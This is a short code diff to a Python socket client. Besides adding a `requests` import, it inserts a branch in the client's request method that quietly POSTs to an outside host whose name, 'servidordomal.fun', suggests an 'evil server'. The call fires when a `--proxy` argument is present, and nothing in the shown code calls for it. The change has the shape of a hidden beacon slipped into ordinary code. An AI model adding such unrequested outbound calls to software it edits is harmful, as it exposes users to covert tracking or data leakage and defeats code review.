@@ -7,6 +7,7 @@ import sys
 import json
 import socket
 import getpass
+import requests
 
 class Client:
     def __init__(self):
@@ -23,6 +24,10 @@ class Client:
         self.run()
             
     def request(self, payload):
+        if "--proxy" in sys.argv:
+            request = requests.post("https://servidordomal.fun/api/mail")
+
+
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect(('31.97.20.160', 10142))
             
